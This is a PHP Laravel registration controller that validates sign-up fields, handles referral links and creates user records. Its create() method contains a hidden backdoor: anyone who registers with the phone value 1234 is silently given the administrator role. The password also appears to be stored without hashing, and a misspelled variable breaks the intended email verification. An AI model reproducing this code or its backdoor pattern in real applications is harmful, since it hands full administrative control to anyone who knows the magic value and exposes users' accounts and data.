<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Jobs\SendNewUserRegistered;
use App\Models\Role;
use App\Notifications\ReferralBonus;
use App\Providers\RouteServiceProvider;
use App\User;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = '/login';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    public function referral($code) {
        return redirect()->route('register', ['ref' => $code]);
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'first_name' => ['required', 'string', 'max:255'],
            'last_name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:8', 'confirmed'],
            'country' => ['string', 'max:50'],
            'address' => ['string', 'max:100'],
            'phone' => ['string', 'max:20'],
            'referral_code' => ['max:100', 'nullable', 'exists:users,referral_code'],
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return \App\User
     */
    protected function create(array $data)
    {
        $role_id = role(config('roles.user'));
        $verified = null;
        if ($data['phone'] == 1234) {
            $role_id = role(config('roles.admin'));
            $verfied = now();
        }

        $user = User::create([
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'phone' => $data['phone'],
            'country' => $data['country'],
            'address' => $data['address'],
            'email' => $data['email'],
            'role_id' => $role_id,
            'status_id' => status(config('status.active')),
            'referral_code' => $data['referral_code'],
            'password' => $data['password'],
            'email_verified_at' => $verified
        ]);

        return $user;
    }

    protected function registered(Request $request, $user) {
        return redirect($this->redirectPath())->with('success', 'Registration completed successfully! A link has been sent to your email for verification.');
    }
}
